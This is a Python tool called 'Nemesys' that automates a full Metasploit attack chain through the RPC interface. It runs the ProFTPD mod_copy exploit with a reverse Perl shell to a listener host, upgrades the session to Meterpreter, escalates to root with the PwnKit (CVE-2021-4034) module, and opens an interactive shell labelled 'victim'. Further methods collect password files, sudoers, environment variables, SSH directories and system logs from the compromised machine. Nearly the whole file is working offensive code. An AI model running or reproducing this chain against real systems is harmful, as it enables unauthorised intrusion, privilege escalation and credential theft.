import datetime
import logging
import re
import shlex
import subprocess
from pymetasploit3.msfrpc import MsfRpcClient
import time
from datetime import datetime

# Logger configuration
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s",
    handlers=[logging.StreamHandler()]
)
logger = logging.getLogger("Nemesys")

class Nemesys:
    def __init__(self, password, ssl=True):
        """Initializes and connects to the Metasploit client."""
        try:
            self.client = MsfRpcClient(password, ssl=ssl)
            logger.info("💀 Connected to Metasploit! Ready for action...")
        except Exception as e:
            logger.error(f"❌ Failed to connect to Metasploit: {e}")
            self.client = None

    def exploit(self, exploit_name, payload_name, exploit_options={}, payload_options={}):
        """
        Executes a specific exploit with the chosen payload and handles post-exploitation tasks.
        
        Args:
            exploit_name (str): Name of the exploit module.
            payload_name (str): Name of the payload module.
            exploit_options (dict): Options for the exploit (e.g., RHOSTS, RPORT).
            payload_options (dict): Options for the payload (e.g., LHOST, LPORT).
        """
        if not self.client:
            logger.warning("⚠️ Client is not connected.")
            return None

        # Run the initial exploit
        exploit_uuid = self._run_exploit(exploit_name, payload_name, exploit_options, payload_options)
        if exploit_uuid:
            session_id = self._get_session_id(exploit_uuid)
            if session_id:
                new_session_id = self._upgrade_session(int(session_id))
                new_session_id = self._perform_privilege_escalation(new_session_id)
                ##self._enumerate_system(session_id)
                self._open_shell(new_session_id)
            else:
                logger.error("❌ No session was established.")
        else:
            logger.error("❌ Exploit execution failed.")

    
    def _upgrade_session(self, session_id):
        """
        Upgrades a basic shell session to Meterpreter using the 'shell_to_meterpreter' module.

        Args:
            session_id (int): ID of the active shell session.

        Returns:
            int: New Meterpreter session ID if upgrade was successful, None otherwise.
        """
        console_id = self.client.consoles.console().cid
        exploit_module = 'multi/manage/shell_to_meterpreter'
        new_session_id = None

        try:
            logger.info("🚀 Initiating session upgrade to Meterpreter...")
            logger.debug(f"🔍 Using exploit module: {exploit_module}")

            # Configure the exploit module
            self.client.consoles.console(console_id).write(f'use {exploit_module}\n')
            self.client.consoles.console(console_id).write(f'set SESSION {session_id}\n')
            self.client.consoles.console(console_id).write(f'set PAYLOAD_OVERRIDE linux/x64/meterpreter/reverse_tcp\n')
            self.client.consoles.console(console_id).write(f'set PLATFORM_OVERRIDE linux\n')
            
            logger.info(f"🔧 Running the upgrade for session {session_id}...")
            self.client.consoles.console(console_id).write('run\n')

            # Wait for the upgrade process to complete
            time.sleep(30)

            # Read the console output
            output = self.client.consoles.console(console_id).read()
            upgrade_output = output.get('data', '')

            # Check the output for a new Meterpreter session ID
            if "Meterpreter session" in upgrade_output:
                # Extract the new session ID using a regular expression
                match = re.search(r'Meterpreter session (\d+) opened', upgrade_output)
                if match:
                    new_session_id = int(match.group(1))
                    logger.info(f"✅ New Meterpreter session established: Session ID {new_session_id}")
                else:
                    logger.warning("⚠️ Could not extract the new session ID from the output.")
            elif "Post module execution completed" in upgrade_output:
                logger.info("✅ Upgrade module execution completed, but no new session ID found.")
            elif "Exploit failed" in upgrade_output or "No session was created" in upgrade_output:
                logger.error("❌ Session upgrade failed: No Meterpreter session created.")
            else:
                logger.warning("⚠️ Unknown status. The upgrade process may not have completed as expected.")

        except Exception as e:
            logger.error(f"⚠️ Error during session upgrade: {e}")

        finally:
            # Clean up the console session
            self.client.consoles.console(console_id).destroy()
            logger.info("🧹 Console session destroyed after upgrade attempt.")

        return new_session_id

    def _perform_privilege_escalation(self, session_id):
        """
        Executes a local privilege escalation exploit and attempts to retrieve the new Meterpreter session ID.

        Args:
            session_id (int): ID of the current session.

        Returns:
            int: New Meterpreter session ID if escalation is successful, None otherwise.
        """
        console_id = self.client.consoles.console().cid
        exploit_module = 'linux/local/cve_2021_4034_pwnkit_lpe_pkexec'
        new_session_id = None

        try:
            logger.info("🚀 Starting privilege escalation using PwnKit (CVE-2021-4034)...")
            logger.debug(f"🔍 Using exploit module: {exploit_module}")

            # Configure the exploit module
            self.client.consoles.console(console_id).write(f'use {exploit_module}\n')
            self.client.consoles.console(console_id).write(f'set SESSION {session_id}\n')
            self.client.consoles.console(console_id).write('set LHOST 192.168.11.129\n')

            logger.info("🔧 Executing the privilege escalation module...")
            self.client.consoles.console(console_id).write('run\n')

            # Wait for the module to execute
            time.sleep(30)

            # Read the console output
            output = self.client.consoles.console(console_id).read()
            escalation_output = output.get('data', '')

            # Check the output for a new Meterpreter session ID
            if "Meterpreter session" in escalation_output:
                # Extract the new session ID using a regular expression
                match = re.search(r'Meterpreter session (\d+) opened', escalation_output)
                if match:
                    new_session_id = int(match.group(1))
                    logger.info(f"✅ Privilege escalation successful! New Meterpreter session ID: {new_session_id}")
                else:
                    logger.warning("⚠️ Could not extract the new session ID from the output.")
            elif "Post module execution completed" in escalation_output:
                logger.info("✅ Privilege escalation module execution completed, but no new session ID found.")
            elif "Exploit failed" in escalation_output or "No session was created" in escalation_output:
                logger.error("❌ Privilege escalation failed: No Meterpreter session created.")
            else:
                logger.warning("⚠️ Unknown status. The privilege escalation process may not have completed as expected.")

        except Exception as e:
            logger.error(f"⚠️ Error during privilege escalation: {e}")

        finally:
            # Clean up the console session
            self.client.consoles.console(console_id).destroy()
            logger.info("🧹 Console session destroyed after privilege escalation attempt.")

        return new_session_id


    def _run_exploit(self, exploit_name, payload_name, exploit_options, payload_options):
        """Private method to run the specified exploit and return its UUID."""
        exploit = self.client.modules.use("exploit", exploit_name)
        for option, value in exploit_options.items():
            exploit[option] = value

        payload = self.client.modules.use("payload", payload_name)
        for option, value in payload_options.items():
            payload[option] = value

        logger.info(f"☠️ Running exploit '{exploit_name}' with payload '{payload_name}'...")
        try:
            output = exploit.execute(payload=payload)
            logger.info("🔥 Exploit executed successfully.")
            logger.debug(f"Execution output: {output}")
            return output.get('uuid')
        except Exception as e:
            logger.error(f"❌ Failed to execute exploit: {e}")
            return None

    def _get_session_id(self, uuid, timeout=15):
        """Retrieves the session ID generated by an exploit, if available."""
        if not self.client:
            logger.warning("⚠️ Client is not connected.")
            return None

        end_time = time.time() + timeout
        logger.info(f"⏳ Waiting for session to become active...")

        while time.time() < end_time:
            sessions = self.client.sessions.list
            for session in sessions:
                if sessions[session].get('exploit_uuid') == uuid:
                    logger.info(f"💀 Session established! Session ID: {session}")
                    return session
            time.sleep(1)

        logger.warning("⚠️ No session found.")
        return None

    def _open_shell(self, session_id, timeout=30):
        """
        Private method that allows interaction with an open shell session.

        Args:
            session_id (int): The session ID to interact with.
            timeout (int): Maximum time (in seconds) to wait for the session to become active.

        Returns:
            None
        """
        logger.info("🔍 Listing available sessions:")
        sessions = self.client.sessions.list
        for sid, session in sessions.items():
            logger.info(f"Session ID: {sid} | Type: {session.get('type')} | User: {session.get('username')}")

        # Wait for the session to become available
        end_time = time.time() + timeout
        shell = None
        while time.time() < end_time:
            try:
                # Try to access the session
                shell = self.client.sessions.session(str(session_id))
                logger.info(f"💀 Session {session_id} is now active!")
                break  # Exit loop if session is found
            except KeyError:
                logger.info(f"⏳ Waiting for session {session_id} to become available...")
                time.sleep(1)

        if not shell:
            logger.error(f"❌ Session ID {session_id} does not exist after waiting.")
            return  # Exit early if session is not found.

        # Check if the session is a Meterpreter session
        session_info = self.client.sessions.list.get(str(session_id), {})
        is_meterpreter = session_info.get('type', '').lower() == 'meterpreter'

        banner = """
        ╔════════════════════════════════════════════════════════════╗
        ║            💀 Welcome to the Nemesys Shell Interface 💀   ║
        ║────────────────────────────────────────────────────────────║
        ║  ⚔️  Your gateway to post-exploitation and system control.║
        ║  🔍  Type 'help' for available commands.                   ║
        ║  🚪  Type 'exit' to leave the interactive session.         ║
        ╚════════════════════════════════════════════════════════════╝
        """

        logger.info(banner)

        try:
            while True:
                # Execute an initial check command based on the session type
                if is_meterpreter:
                    shell.write("getuid\n")
                    time.sleep(1)
                    user = shell.read().strip()
                    if "Unknown command" in user:
                        user = "Meterpreter session (user unknown)"
                else:
                    shell.write("whoami\n")
                    time.sleep(1)
                    user = shell.read().strip()

                # Get the current working directory
                shell.write("pwd\n")
                time.sleep(1)
                directory = shell.read().strip()

                # Build the prompt with user and directory information
                prompt = f"{user}@victim:{directory}$ "
                command = input(prompt)

                if command.lower() == 'exit':
                    logger.info("👋 Exiting interactive session.")
                    break

                # Send the command to the shell
                shell.write(command + '\n')
                time.sleep(1)
                output = shell.read()

                # Log the output of the command execution
                logger.info(output)
        except KeyboardInterrupt:
            logger.info("👋 Exiting interactive session due to KeyboardInterrupt.")


    def _enumerate_system(self, session_id):
        """Performs system enumeration to gather critical information."""
        logger.info("💀 Starting system enumeration...")

        # Generate a filename with timestamp to avoid conflicts
        timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        log_filename = f"system_enumeration_{timestamp}.log"

        # Open the log file to store command outputs
        with open(log_filename, "a") as log_file:
            # Run specific enumeration tasks
            self._enumerate_os_and_kernel(session_id, log_file)
            self._enumerate_kernel_vulnerabilities(session_id, log_file)
            self._enumerate_permissions_and_configs(session_id, log_file)
            self._inspect_running_services(session_id, log_file)
            self._check_network_configs(session_id, log_file)
            self._inspect_config_files(session_id, log_file)
            self._evaluate_insecure_binaries(session_id, log_file)
            self._identify_elevated_accounts(session_id, log_file)
            self._scan_for_malware(session_id, log_file)
            self._inspect_system_logs(session_id, log_file)
            self._check_installed_packages(session_id, log_file)
            self._check_selinux_apparmor(session_id, log_file)
            logger.info(f"💀 System enumeration complete ✅ (Results saved in {log_filename})")

    def _enumerate_os_and_kernel(self, session_id, log_file):
        """Enumerates the OS and kernel version."""
        logger.info("🖥️ Enumerating OS and kernel version...")
        self._run_command(session_id, "uname -a", log_file)
        self._run_command(session_id, "cat /etc/issue", log_file)
        self._run_command(session_id, "cat /etc/*release", log_file)
        logger.info("🖥️ OS and kernel version enumeration complete ✅")

    def _enumerate_kernel_vulnerabilities(self, session_id, log_file):
        """Identifies kernel vulnerabilities."""
        logger.info("🔍 Identifying kernel vulnerabilities...")
        kernel_version_output = self._run_command(session_id, "cat /proc/version", log_file)
        if kernel_version_output:
            kernel_version = kernel_version_output.strip()
            logger.info(f"Kernel version: {kernel_version}")
            self._search_kernel_vulnerabilities(kernel_version, log_file)
        else:
            logger.warning("❌ Failed to retrieve kernel version from /proc/version")
        
        logger.info("🔍 Kernel vulnerability identification complete ✅")

    def _search_kernel_vulnerabilities(self, kernel_version, log_file):
        """Uses searchsploit to find known vulnerabilities for the given kernel version."""
        logger.info(f"🔍 Searching for kernel vulnerabilities for version: {kernel_version}...")
        # Clean up the kernel version by extracting only the essential part (e.g., 3.13.0-24)
        cleaned_kernel_version = self._clean_kernel_version(kernel_version)
        if cleaned_kernel_version:
            search_query = f"linux kernel {cleaned_kernel_version}"
            try:
                result = self._run_searchsploit(search_query, log_file)
                if result:
                    logger.info(f"🔍 searchsploit results for {search_query}:\n{result}")
            except Exception as e:
                logger.error(f"❌ Failed to run searchsploit: {e}")
        else:
            logger.warning("❌ Invalid or empty kernel version.")

    def _clean_kernel_version(self, kernel_version):
        """Cleans up the kernel version string to extract only the essential part."""
        # Regex to match the kernel version pattern and strip out extra information
        match = re.match(r"Linux version ([0-9]+\.[0-9]+\.[0-9]+-[0-9]+)", kernel_version)
        if match:
            return match.group(1)
        else:
            return None

    def _run_searchsploit(self, query, log_file):
        """Runs the searchsploit command and returns the output."""
        try:
            command = f"searchsploit {query}"
            command_list = shlex.split(command)
            result = subprocess.check_output(command_list, stderr=subprocess.STDOUT)
            result = result.decode('utf-8')
            log_file.write(f"Executed command: {command}\n")
            log_file.write(f"Output: {result}\n\n")
            return result
        except subprocess.CalledProcessError as e:
            return None
        except Exception as e:
            return None

    def _enumerate_permissions_and_configs(self, session_id, log_file):
        """Enumerates sensitive permissions and configurations."""
        logger.info("🔑 Enumerating sensitive permissions and configurations...")
        self._run_command(session_id, "id", log_file)
        self._run_command(session_id, "cat /etc/passwd", log_file)
        self._run_command(session_id, "cat /etc/group", log_file)
        self._run_command(session_id, "find / -perm -4000 -type f 2>/dev/null", log_file)
        self._run_command(session_id, "sudo -l", log_file)
        logger.info("🔑 Sensitive permissions and configurations enumeration complete ✅")

    def _inspect_running_services(self, session_id, log_file):
        """Inspects running processes and services."""
        logger.info("⚙️ Inspecting running processes and services...")
        self._run_command(session_id, "ps aux", log_file)
        self._run_command(session_id, "netstat -tulnp", log_file)
        self._run_command(session_id, "ss -tulnp", log_file)
        logger.info("⚙️ Running processes and services inspection complete ✅")

    def _check_network_configs(self, session_id, log_file):
        """Checks network configurations and possible pivots."""
        logger.info("🌐 Checking network configurations and possible pivots...")
        self._run_command(session_id, "ip route", log_file)
        self._run_command(session_id, "ifconfig", log_file)
        self._run_command(session_id, "ip addr", log_file)
        logger.info("🌐 Network configurations and pivot checks complete ✅")

    def _inspect_config_files(self, session_id, log_file):
        """Inspects configuration files and passwords."""
        logger.info("🔐 Inspecting configuration files and passwords...")
        self._run_command(session_id, "env", log_file)
        self._run_command(session_id, "find / -name '*.ssh'", log_file)
        logger.info("🔐 Configuration files and passwords inspection complete ✅")

    def _evaluate_insecure_binaries(self, session_id, log_file):
        """Evaluates insecure binaries or vulnerable libraries."""
        logger.info("⚠️ Evaluating insecure binaries or vulnerable libraries...")
        self._run_command(session_id, "python --version", log_file)
        self._run_command(session_id, "perl --version", log_file)
        self._run_command(session_id, "gcc --version", log_file)
        logger.info("⚠️ Insecure binaries and vulnerable libraries evaluation complete ✅")

    def _inspect_config_files(self, session_id, log_file):
        """Inspects sensitive configuration files."""
        logger.info("🔐 Inspecting sensitive configuration files...")
        # Check /etc/sudoers
        self._run_command(session_id, "cat /etc/sudoers", log_file)
        # Check /etc/fstab
        self._run_command(session_id, "cat /etc/fstab", log_file)
        # Check cron jobs
        self._run_command(session_id, "cat /etc/cron.d/*", log_file)
        self._run_command(session_id, "cat /etc/cron.daily/*", log_file)
        logger.info("🔐 Inspection of configuration files complete ✅")

    def _identify_elevated_accounts(self, session_id, log_file):
        """Identifies accounts with elevated privileges."""
        logger.info("🔑 Identifying accounts with elevated privileges...")
        # Check for groups with sudo privileges
        self._run_command(session_id, "grep 'sudo' /etc/group", log_file)
        self._run_command(session_id, "grep 'wheel' /etc/group", log_file)
        # Check if the root user is enabled
        self._run_command(session_id, "grep 'root' /etc/passwd", log_file)
        # Check for users with interactive shell
        self._run_command(session_id, "cat /etc/passwd | grep -E '/bin/bash|/bin/sh'", log_file)
        logger.info("🔑 Identification of elevated accounts complete ✅")

    def _inspect_file_permissions(self, session_id, log_file):
        """Inspects permissions on critical files and directories."""
        logger.info("⚠️ Inspecting permissions on critical files and directories...")
        self._run_command(session_id, "ls -l /etc/passwd", log_file)
        self._run_command(session_id, "ls -l /etc/shadow", log_file)
        self._run_command(session_id, "ls -l /etc/sudoers", log_file)
        self._run_command(session_id, r"find / -type f -perm -002 -exec ls -l {} \;", log_file)
        self._run_command(session_id, r"find / -type f -perm -4000 -exec ls -l {} \;", log_file)
        logger.info("⚠️ Inspection of file permissions complete ✅")

    def _scan_for_malware(self, session_id, log_file):
        """Scans for malware or rootkits on the system."""
        logger.info("🔍 Scanning for malware and rootkits...")
        # Check for rootkits
        self._run_command(session_id, "chkrootkit", log_file)
        # Additional rootkit check
        self._run_command(session_id, "rkhunter --check", log_file)
        # Check for suspicious temporary files
        self._run_command(session_id, "find /tmp -type f", log_file)
        self._run_command(session_id, "find /var/tmp -type f", log_file)
        logger.info("🔍 Malware and rootkit scan complete ✅")

    def _inspect_system_logs(self, session_id, log_file):
        """Inspects system logs for suspicious activity."""
        logger.info("📜 Inspecting system logs...")
        # Check authentication logs
        self._run_command(session_id, "cat /var/log/auth.log", log_file)
        # Check syslog
        self._run_command(session_id, "cat /var/log/syslog", log_file)
        # Check messages logs
        self._run_command(session_id, "cat /var/log/messages", log_file)
        logger.info("📜 Inspection of system logs complete ✅")

    def _check_installed_packages(self, session_id, log_file):
        """Checks installed packages and searches for known vulnerabilities."""
        logger.info("🔍 Reviewing installed packages")
        # List installed packages (Debian/Ubuntu)
        #self._run_command(session_id, "dpkg --list", log_file)
        logger.info("🔍 Review of installed packages ✅")

    def _check_selinux_apparmor(self, session_id, log_file):
        """Checks the configuration of SELinux or AppArmor."""
        logger.info("🔐 Checking SELinux/AppArmor configuration...")
        # Check SELinux status
        self._run_command(session_id, "getenforce", log_file)
        # Check AppArmor status
        self._run_command(session_id, "aa-status", log_file)
        logger.info("🔐 SELinux/AppArmor configuration check complete ✅")

    def _run_command(self, session_id, command, log_file):
        """Runs a command on the victim's machine via the session."""
        shell = self.client.sessions.session(session_id)
        shell.write(command + '\n')
        time.sleep(60)
        output = shell.read()
        logger.info(f"Executed command: {command}\n")
        logger.info(f"Output: {output}\n")
        if output:
            log_file.write(f"Executed command: {command}\n")
            log_file.write(f"Output: {output}\n\n")
        return output


def main():
    """Main function that orchestrates the flow using the Nemesys class."""
    client = Nemesys("password")

    # Exploit and payload configuration
    exploit_name = "unix/ftp/proftpd_modcopy_exec"
    payload_name = "cmd/unix/reverse_perl"
    exploit_options = {
        'RHOSTS': '192.168.11.128',
        'SITEPATH': '/var/www/html'
    }
    payload_options = {
        'LHOST': '192.168.11.129',
        'LPORT': 4445
    }

    # Execute the exploit and perform system enumeration
    client.exploit(exploit_name, payload_name, exploit_options, payload_options)

if __name__ == "__main__":
    main()